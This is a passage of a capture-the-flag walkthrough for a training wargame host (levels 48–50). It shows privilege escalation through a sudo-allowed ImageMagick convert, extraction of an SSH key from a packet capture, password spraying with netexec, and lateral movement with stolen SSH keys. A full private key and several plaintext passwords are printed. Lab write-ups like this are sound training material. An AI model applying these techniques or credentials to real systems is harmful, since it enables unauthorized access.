uid=2039(phoebe) gid=2039(phoebe) groups=2039(phoebe)
  1050345      4 -rw-r--r--   1 phoebe   phoebe        220 Apr 23  2023 ./.bash_logout
  1050346      4 -rw-r--r--   1 phoebe   phoebe       3526 Apr 23  2023 ./.bashrc
  1050348      4 -rw-r-----   1 root     phoebe         22 Apr  5  2024 ./flagz.txt
  1050349      4 -rw-r-----   1 root     phoebe        139 Apr  5  2024 ./mission.txt
  1050347      4 -rw-r--r--   1 phoebe   phoebe        807 Apr 23  2023 ./.profile
################
# MISSION 0x48 #
################
User rhea likes pictures.
```

```bash
phoebe@hades:~$ sudo -l
Matching Defaults entries for phoebe on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User phoebe may run the following commands on hades:
    (rhea) NOPASSWD: /usr/bin/convert

phoebe@hades:~$ convert | head -3
Version: ImageMagick 6.9.11-60 Q16 x86_64 2021-01-25 https://imagemagick.org
Copyright: (C) 1999-2021 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
```

```bash
phoebe@hades:~$ find / -user rhea -ls 2>/dev/null | grep -v /var/tmp
phoebe@hades:~$ find / -group rhea -ls 2>/dev/null | grep -v /var/tmp
    22050      4 -rw-r-----   1 root     rhea           21 Apr  5  2024 /usr/sbin/re
  1050350      4 drwxr-x---   2 root     rhea         4096 Apr  5  2024 /pwned/rhea
```

[simple conversion of text report to jpg image file](https://imagemagick.org/discourse-server/viewtopic.php?t=36416&sid=d73f9cfb8e2b6f4ab7004cdec115f8e4)

```bash
phoebe@hades:~$ sudo -u rhea convert TEXT:/usr/sbin/re /tmp/letmein.jpg
# Make it more readable
phoebe@hades:~$ sudo -u rhea convert -pointsize 36 -gravity center TEXT:/usr/sbin/re /tmp/letmein.jpg
phoebe@hades:~$ ls -l /tmp/letmein.jpg
-rw-r--r-- 1 rhea rhea 3945 Aug 16 18:27 /tmp/letmein.jpg

└─$ sshpass -p 'FPLwKmmKhcWAwRxiaBDN' scp -P 6666 phoebe@hades.hackmyvm.eu:/tmp/letmein.jpg .
└─$ tesseract letmein.jpg -
Estimating resolution as 338
iKVVfwEDFbBpTnlnKZKr
```

> Creds: `rhea:iKVVfwEDFbBpTnlnKZKr`

## Level 49

```bash
rhea@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2040(rhea) gid=2040(rhea) groups=2040(rhea)
  1050351      4 -rw-r--r--   1 rhea     rhea          220 Apr 23  2023 ./.bash_logout
  1050352      4 -rw-r--r--   1 rhea     rhea         3526 Apr 23  2023 ./.bashrc
  1050355      4 -rw-r-----   1 root     rhea           22 Apr  5  2024 ./flagz.txt
  1050356      4 -rw-r-----   1 root     rhea          156 Apr  5  2024 ./mission.txt
  1050354      4 -rw-r-----   1 root     rhea         3972 Apr  5  2024 ./capture.pcapng
  1050353      4 -rw-r--r--   1 rhea     rhea          807 Apr 23  2023 ./.profile
################
# MISSION 0x49 #
################
User selene wants to tell us something...
```

```bash
└─$ sshpass -p 'iKVVfwEDFbBpTnlnKZKr' scp -P 6666 rhea@hades.hackmyvm.eu:capture.pcapng .
```

![hades-8.png](/assets/ctf/hackmyvm/hades-8.png)

If we follow the HTTP stream there's ZIP file downloaded

![hades-9.png](/assets/ctf/hackmyvm/hades-9.png)

File > Export Objects > HTTP > Save

```bash
└─$ unzip id.zip
Archive:  id.zip
  inflating: id_rsa

└─$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA6m8jc3NEzQBue8NzNmhxHNVfgCmx+EumEFhq0amDaepnME4N8DWC
O/tHCAh8np089DlUDHpe/8T06muybeN02U8ULr1HJGl03q4nAcHi+tA82ES3MJaWu97BmS
qsEWxDZvYVgySjsG7bbEPE/OuYlWDXfj9QSnD4QNccrt9BmFp3HLGdDt+bbkuQZ6ElN1Qd
m9PFN9GYfM3g0/sM68jtw2XHO7KWKucaod1BOERknGxaM3FqHl+6Rpk3piQthoC+Nuqe5f
jm3rgu4sqXLAd7iFf+NBKDfTmfzwxxH/bIR/Cl1mJwHcC75IceW5OC2wtu938JflO6VFcT
58a0S+GcZwAAA8iJKHc6iSh3OgAAAAdzc2gtcnNhAAABAQDqbyNzc0TNAG57w3M2aHEc1V
+AKbH4S6YQWGrRqYNp6mcwTg3wNYI7+0cICHyenTz0OVQMel7/xPTqa7Jt43TZTxQuvUck
aXTericBweL60DzYRLcwlpa73sGZKqwRbENm9hWDJKOwbttsQ8T865iVYNd+P1BKcPhA1x
yu30GYWnccsZ0O35tuS5BnoSU3VB2b08U30Zh8zeDT+wzryO3DZcc7spYq5xqh3UE4RGSc
bFozcWoeX7pGmTemJC2GgL426p7l+ObeuC7iypcsB3uIV/40EoN9OZ/PDHEf9shH8KXWYn
AdwLvkhx5bk4LbC273fwl+U7pUVxPnxrRL4ZxnAAAAAwEAAQAAAQAVYlHfhBIwiOuLCocF
3X0D3kq5zBPZzDy3nPkRat772E/VTiljUd4xTnhqOSv04+7dcCVEhh0IQ5T7lRtPfsH32I
jEwqssnRn1/fi85kyoCDqkl5AGNJZHSMhsCkJrzG5Rg/zuW3c67sHBHGVplKv0ZEMD1w6h
27ApafXJ1b+L//fHjLbq+HVdrRTF2XmVXSgWj2NpjhdRUzfrcSNz+QgBnltzaY8YJYTsOD
jcLClwnOgCpWS+YghzQUDMr+uoIeSGNTM08q2Y+cPKUPNJ4+J/cA1vDsZiA79jxSrEdII4
BJ9GPbOHempz07SN7hy46Z5cpLuSN0xmTkbkzftSvQShAAAAgQDV42e8bUweH17x+NLduU
CrfIEJmwaJ8xaER4SizExG6R2aGyqXlefPVeZDnRtLR70y4NEPCbOVlmlk+t6n0gn3Pjxt
WdPXE5O18uwwSSjs182DcVqB6NWq2SrKLPSDVQIHNjaFVyLhHav7k2sIokAgMx9/oojNBd
qMuXTseyeyjQAAAIEA/quM6uiMpyjTKegVGt/pCeXFKwK3vKQpyY/gwrtJKMbG4tIWCnBC
ah891PHlq/hQbsrw0QIw/xpmh0YnxB8fsYbqhIh6zWXsyx0pIZUqSg7BA1Tx5ZJtWZg6VM
T2vioJQ9tTerPDUDY0b2f69odG0t+S6OP1WxyHJvyoZsLYHh8AAACBAOuoiTnUIRfPLBHA
zLp7cbH/6FG1l+TzKzBrBuUp4i3gg0Sautfh1/JMcc/zl0Pe2SxvCX0c64xEtLMIVn9/ov
hMk1sbuGbpcrY/N99/xk8NZMDXPSlROgOZ5BLdYu7xrHzWRiAZ/2S7rV4dtLK9L3FuCWjZ
SD+hjsg3DNNJISi5AAAADXNtbEBjYXNzYW5kcmEBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

└─$ ssh hades.hackmyvm.eu -p 6666 -l selene -i id_rsa 'cat flagz.txt'
^VgZLrvZyzGYvqegkslh^
```

> Creds: `selene:zZqEimsDlLPqIyqzNyWB`

## Level 50

```bash
selene@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2041(selene) gid=2041(selene) groups=2041(selene)
  1050358      4 -rw-r--r--   1 selene   selene        220 Apr 23  2023 ./.bash_logout
  1050359      4 -rw-r--r--   1 selene   selene       3526 Apr 23  2023 ./.bashrc
  1050364      4 -r--r-----   1 selene   selene        400 Apr  5  2024 ./.ssh/id_rsa.pub
  1050362      4 -r--r-----   1 selene   selene        400 Apr  5  2024 ./.ssh/authorized_keys
  1050363      4 -r--r-----   1 selene   selene       1825 Apr  5  2024 ./.ssh/id_rsa
  1050365      4 -rw-r-----   1 root     selene         22 Apr  5  2024 ./flagz.txt
  1050366      4 -rw-r-----   1 root     selene        174 Apr  5  2024 ./mission.txt
  1050360      4 -rw-r--r--   1 selene   selene        807 Mar 13 03:04 ./.profile
################
# MISSION 0x50 #
################
The user maria ... I think I have seen her password.
```

Password reuse was not successful, nor was `id_rsa` from previous challenge.
```bash
└─$ netexec ssh hades.hackmyvm.eu --port 6666 -u maria -p passwords.txt -t 6 --jitter 15
```

By running `find .` in each user’s directory and logging the results, I quickly noticed that **Calliope** and **Hera** both had SSH keys. Using those keys with SSH login as **Maria** turned out to be successful.
```bash
└─$ sshpass -p 'IlhyWxZuqIHAuqVOpXfQ' scp -P 6666 calliope@hades.hackmyvm.eu:~/.ssh/id_rsa id_rsa.calliope
└─$ sshpass -p 'JzpyRXRzWoHKZwgWzleM' scp -P 6666 hera@hades.hackmyvm.eu:~/.ssh/id_rsa id_rsa.hera
└─$ chmod 600 id_rsa*
# Fail
└─$ ssh hades.hackmyvm.eu -p 6666 -l maria -i id_rsa.calliope
# Success
└─$ ssh hades.hackmyvm.eu -p 6666 -l maria -i id_rsa.hera
```

```bash
maria@hades:~$ id; find . -type f -ls; cat congrats.txt; cat flagz.txt
uid=2042(maria) gid=2042(maria) groups=2042(maria)
  1050312      4 -rw-r-----   1 root     maria         326 Apr  5  2024 ./congrats.txt
  1050305      4 -rw-r--r--   1 maria    maria         220 Apr 23  2023 ./.bash_logout
  1050306      4 -rw-r--r--   1 maria    maria        3526 Apr 23  2023 ./.bashrc
  1050310      4 -rw-r-----   1 root     maria         569 Apr  5  2024 ./.ssh/authorized_keys
  1050311      4 -rw-r-----   1 root     maria        2590 Apr  5  2024 ./.ssh/id_rsa
  1050313      4 -rw-r-----   1 root     maria          22 Apr  5  2024 ./flagz.txt
  1050307      4 -rw-r-----   1 root     maria          23 Apr  5  2024 ./.loca1
  1050308      4 -rw-r--r--   1 maria    maria         807 Apr 23  2023 ./.profile
################
#   CONGRATS   #
################
Congrats You did it!! If you like it or you have some ideas, just give us your feedback!! Or maybe this is not the last level?
```

> Creds: `maria:KZTKpCZzFqmaahwyzuKo`
